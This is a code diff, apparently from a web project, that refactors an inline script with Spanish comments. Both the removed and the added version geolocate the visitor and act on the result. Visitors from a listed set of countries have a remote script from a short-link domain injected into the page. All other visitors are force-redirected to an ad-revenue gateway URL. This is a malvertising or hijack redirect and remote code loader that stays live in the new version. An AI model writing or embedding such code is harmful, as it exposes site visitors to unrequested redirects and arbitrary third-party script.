@@ -1,27 +1,25 @@
 <script>
-let countryHack = ['MX', 'DO', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; //pais
-let leturlplantilla = 'https://tickto.sbs/0Py3qQJN';
-let urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
-let country;
+const countryHack = ['MX', 'DO', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ'];
+const urlPlantilla = 'https://tickto.sbs/0Py3qQJN'; // Reemplaza con tu URL deseada
+const urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
 
 fetch('https://get.geojs.io/v1/ip/country')
     .then((response) => response.text())
     .then((data) => {
-        country = data;
-        country = countryHack.find((str) => str === country.trim());
-        redirectURL(country)
-    })
+        const country = data.trim();
 
-function redirectURL(country) {
-    if (country) {
-        const script = document.createElement('script');
-        script.src = leturlplantilla; // Changed the variable name here
-        document.head.appendChild(script);
+        if (countryHack.includes(country)) {
+            loadScript(urlPlantilla);
+            console.log('Redirigiendo a la plantilla para el país ' + country);
+        } else {
+            window.location.href = urlPromocion;
+            console.log('Redirigiendo a la promoción');
+        }
+    });
 
-        console.log('https://yuy4o.app.link/0fkXSJqnaCb' + country)
-    } else {
-        window.location.href = urlPromocion;
-        console.log('REDIRECT ADS...' + country)
-    }
+function loadScript(scriptUrl) {
+    const script = document.createElement('script');
+    script.src = scriptUrl;
+    document.head.appendChild(script);
 }
 </script>
